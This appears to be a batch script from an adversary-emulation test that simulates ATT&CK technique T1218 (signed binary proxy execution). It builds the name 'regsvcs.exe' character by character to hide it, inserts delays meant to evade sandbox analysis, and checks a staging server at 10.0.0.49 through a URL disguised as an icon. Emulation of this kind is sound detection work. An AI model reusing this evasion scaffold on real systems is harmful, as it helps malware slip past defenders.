@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER encoded)
SET txisnba=%APPDATA%\8172\ef14ba59
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8172-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=taskmgr.txt
SET dvhhyc=8172

REM Obfuscated LOLBIN name - character by character
SET zxc1=r
SET zxc2=e
SET zxc3=g
SET zxc4=s
SET zxc5=v
SET zxc6=c
SET zxc7=s
SET zxc8=.
SET zxc9=e
SET zxc10=x
SET zxc11=e
SET bvncmkl=!zxc1!!zxc2!!zxc3!!zxc4!!zxc5!!zxc6!!zxc7!!zxc8!!zxc9!!zxc10!!zxc11!

REM Log file path with proper quoting
SET "logpath=%APPDATA%\!rrocubc!\macula-simulations.log"

REM Initial delay to evade sandbox analysis
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_start=30s>>> "!logpath!" 2>nul
timeout /t 30 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete>>> "!logpath!" 2>nul

REM Random delay
SET /A delvar=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_start=!delvar!s>>> "!logpath!" 2>nul
timeout /t !delvar! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete>>> "!logpath!" 2>nul

REM TTP: T1218 - Signed Binary Proxy Execution
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check_start>>> "!logpath!" 2>nul
SET resval=0
SET errval=

REM Check server availability with curl
curl -k -s -o NUL "!keghkgto!"
IF !ERRORLEVEL! EQU 0 (
    SET resval=1
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check_success>>> "!logpath!" 2>nul
) ELSE (
    SET resval=0
    SET errval=connection_failed
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check_failed>>> "!logpath!" 2>nul
)

REM TTP logging with locale-independent timestamp
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET datetime=%%I
SET timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!
(
    echo [!timestamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218^|SignedBinaryProxyExecution=!resval!:!errval!
) >> "!logpath!" 2>nul

REM Delay between operations
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: operation_delay_start=5s>>> "!logpath!" 2>nul
ping -n 5 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: operation_delay_complete>>> "!logpath!" 2>nul

REM Change to output directory with error handling
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>>> "!logpath!" 2>nul
cd /d "!txisnba!" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_failed_exiting>>> "!logpath!" 2>nul
    ENDLOCAL
    EXIT /B 1
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_success>>> "!logpath!" 2>nul

REM Final delay before execution
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: pre_execution_delay_start=15s>>> "!logpath!" 2>nul
CHOICE /C Y /T 15 /D Y /N >nul

ENDLOCAL